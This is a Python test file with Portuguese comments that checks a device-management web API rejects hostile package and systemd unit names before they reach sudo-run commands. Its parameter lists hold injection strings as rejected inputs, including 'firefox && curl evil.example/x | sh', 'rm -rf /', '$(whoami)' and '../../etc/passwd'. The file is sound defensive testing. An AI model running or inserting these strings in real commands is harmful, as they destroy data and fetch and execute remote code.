"""Os caminhos que rodam como root, pedidos pelo navegador.

Três coisas nesta caixa passam por ``sudo``: o apt, o flatpak e o systemctl. É o
preço de o modo Advanced ser "um linux normal" -- e é onde um furo não é um bug,
é root na máquina de quem estiver na rede.

A leitura do código diz que está tudo certo: nada usa shell, nomes de pacote
passam por regex que recusa até um "-" no começo, e o systemctl só aceita
unidades com prefixo conhecido. Mas "limpo na leitura" já me enganou neste
projeto -- o verificador de imagem acusou a imagem de não levar a senha dele
porque eu procurei "^project-os:" com grep normal, e o "^" virou âncora de linha.
Então aqui as regras são pedidas pelo HTTP, do jeito que um atacante pediria.

Nada aqui deve passar. Um teste destes que comece a falhar é notícia grande.
"""

from __future__ import annotations

import pytest


def ligar_controle_de_servicos(auth_client):
    """Com o controle desligado tudo dá 403 pelo motivo errado.

    O que se quer provar é que, **mesmo ligado**, uma unidade que não é nossa
    continua recusada. Sem isto o teste passaria por acidente.
    """
    resposta = auth_client.put(
        "/api/settings", json={"values": {"security.allow_service_control": True}}
    )
    assert resposta.status_code in (200, 204), resposta.text


@pytest.mark.parametrize(
    "unidade",
    [
        "sshd",
        "ssh",
        "systemd-journald",
        "cron",
        "nginx",
        "-evil",
        "project",          # prefixo pela metade não vale
        "os-project-os",    # o prefixo tem que estar no começo
    ],
)
def test_o_systemctl_recusa_unidade_que_nao_e_nossa(auth_client, unidade):
    ligar_controle_de_servicos(auth_client)
    resposta = auth_client.post("/api/system/services/%s/restart" % unidade)
    assert resposta.status_code == 403, "%s passou: %s" % (unidade, resposta.text)
    assert resposta.json().get("error") == "unit_not_managed"


def test_o_systemctl_recusa_acao_inventada(auth_client):
    ligar_controle_de_servicos(auth_client)
    resposta = auth_client.post("/api/system/services/project-os/mask")
    assert resposta.status_code == 400
    assert resposta.json().get("error") == "unknown_action"


def test_servico_e_energia_sao_desligados_por_padrao(client):
    """Antes de qualquer conta existir, nem a pergunta é respondida."""
    assert client.post("/api/system/services/project-os/restart").status_code == 428
    assert client.post("/api/system/power", json={"action": "reboot"}).status_code == 428


def test_reiniciar_a_caixa_exige_confirmacao_explicita(auth_client):
    """Um fetch mal endereçado não pode desligar um Pi no meio de uma escrita."""
    ligar_controle_de_servicos(auth_client)
    resposta = auth_client.post("/api/system/power", json={"action": "reboot"})
    assert resposta.status_code == 400
    assert resposta.json().get("error") == "confirm_required"


def test_energia_recusa_acao_inventada(auth_client):
    ligar_controle_de_servicos(auth_client)
    resposta = auth_client.post(
        "/api/system/power", json={"action": "formatar-tudo", "confirm": True}
    )
    assert resposta.status_code in (400, 422), resposta.text


@pytest.mark.parametrize(
    "nome",
    [
        "firefox; rm -rf /",
        "firefox && curl evil.example/x | sh",
        "--reinstall",
        "-o=Dpkg::Options",
        "../../etc/passwd",
        "pacote com espaço",
        "$(whoami)",
        "`id`",
        "pacote\nsegundo",
    ],
)
def test_o_apt_recusa_nome_hostil_pelo_http(auth_client, nome):
    """O campo é "package". A primeira versão deste teste mandava "name".

    Com o campo errado a resposta é 422 por falta de campo obrigatório -- e como
    o teste aceitava 422, ele passava sem nunca ter mostrado um nome hostil ao
    validador. Aqui o 422 não vale: a recusa tem que ser do nome.
    """
    resposta = auth_client.post(
        "/api/packages/install", json={"package": nome, "source": "apt"}
    )
    assert resposta.status_code in (400, 403), "%r passou: %s" % (nome, resposta.text)
    assert "bad_name" in resposta.text or "inválido" in resposta.text or "válido" in resposta.text, (
        "recusou por outro motivo que não o nome: %s" % resposta.text
    )


def espionar_comandos(monkeypatch):
    """Deixa o systemctl "existir" e guarda o que teria sido executado.

    Sem isto o teste não vê nada: no Mac não há systemctl, então o endpoint
    responde 503 antes de montar comando nenhum -- e um teste que passa por
    ausência de systemd não diria nada sobre o Pi.
    """
    import shutil

    from project_os.api import system as api_system

    comandos = []

    async def falso_run(command, check=False):
        comandos.append(list(command))
        return ""

    verdadeiro = shutil.which
    monkeypatch.setattr(
        shutil, "which", lambda nome, *a, **k: "/usr/bin/systemctl"
        if nome == "systemctl" else verdadeiro(nome, *a, **k)
    )
    monkeypatch.setattr(api_system, "_run", falso_run)
    return comandos


def test_parar_um_servico_passa_pelo_sudo(auth_client, monkeypatch):
    """A tela de serviços não funcionaria no Pi sem isto.

    O serviço roda como usuário ``project-os``, não como root. Um ``systemctl
    restart`` sem sudo é recusado pelo logind numa caixa sem sessão gráfica --
    responde "Interactive authentication required" e o endpoint devolve 500. O
    módulo de atualização já tinha aprendido isso do jeito difícil (a
    atualização trocava o código, dizia que tinha acabado e continuava servindo
    a versão velha); a tela de serviços ficou com o mesmo furo.
    """
    comandos = espionar_comandos(monkeypatch)
    ligar_controle_de_servicos(auth_client)

    resposta = auth_client.post("/api/system/services/project-os/restart")
    assert resposta.status_code == 200, resposta.text

    assert comandos, "nenhum comando foi montado"
    assert comandos[-1][:2] == ["sudo", "-n"], comandos[-1]
    assert comandos[-1][2:] == ["systemctl", "restart", "project-os.service"], comandos[-1]


def test_reiniciar_a_caixa_passa_pelo_sudo(auth_client, monkeypatch):
    """``systemctl reboot`` como não-root também é recusado."""
    comandos = espionar_comandos(monkeypatch)
    ligar_controle_de_servicos(auth_client)

    resposta = auth_client.post(
        "/api/system/power", json={"action": "reboot", "confirm": True}
    )
    assert resposta.status_code == 200, resposta.text

    # O reboot é disparado sem esperar (a caixa vai embora antes de responder),
    # então o comando pode ainda não ter saído quando a resposta chega.
    for _ in range(50):
        if comandos:
            break
        auth_client.get("/api/system/health")
    assert comandos, "o reboot não montou comando nenhum"
    assert comandos[-1] == ["sudo", "-n", "systemctl", "reboot"], comandos[-1]


def test_rodando_como_root_nao_chama_sudo(auth_client, monkeypatch):
    """Numa instalação em que o serviço é root, sudo é ruído (e pode não existir)."""
    import os

    comandos = espionar_comandos(monkeypatch)
    monkeypatch.setattr(os, "geteuid", lambda: 0)
    ligar_controle_de_servicos(auth_client)

    resposta = auth_client.post("/api/system/services/project-os/stop")
    assert resposta.status_code == 200, resposta.text
    assert comandos[-1] == ["systemctl", "stop", "project-os.service"], comandos[-1]


def test_nome_esquisito_de_unidade_nao_chega_no_systemctl(auth_client):
    """Nomes que nem chegam a ser rota também não podem virar comando.

    O ".." não aparece na lista de cima porque o cliente HTTP resolve o caminho
    antes de sair -- a URL viraria outra rota. O que importa aqui é o que **não**
    acontece: nenhuma destas formas responde 200.
    """
    for caminho in (
        "/api/system/services/%2e%2e/restart",
        "/api/system/services/sshd.service/stop",
        "/api/system/services/project-os%20;reboot/restart",
    ):
        resposta = auth_client.post(caminho)
        assert resposta.status_code != 200, "%s passou: %s" % (caminho, resposta.text)


def test_nada_neste_projeto_usa_shell_de_verdade():
    """Um shell=True em qualquer lugar reabre tudo isto de uma vez.

    Lido com ``ast``, não com grep: a primeira versão deste teste acusou
    ``core/containers.py``, onde a única aparição de "shell=True" está na
    docstring dizendo que o módulo nunca usa shell. Procurar texto em código é
    justamente o erro que estes testes existem para não repetir.
    """
    import ast
    import pathlib

    raiz = pathlib.Path(__file__).resolve().parents[1] / "project_os"
    culpados = []
    for arquivo in sorted(raiz.rglob("*.py")):
        arvore = ast.parse(arquivo.read_text(encoding="utf-8"), filename=str(arquivo))
        for no in ast.walk(arvore):
            if not isinstance(no, ast.Call):
                continue
            for chave in no.keywords:
                if chave.arg != "shell":
                    continue
                constante = isinstance(chave.value, ast.Constant) and chave.value.value is False
                if not constante:
                    culpados.append("%s:%d" % (arquivo.relative_to(raiz), no.lineno))
    assert not culpados, "shell não-falso em: %s" % ", ".join(culpados)
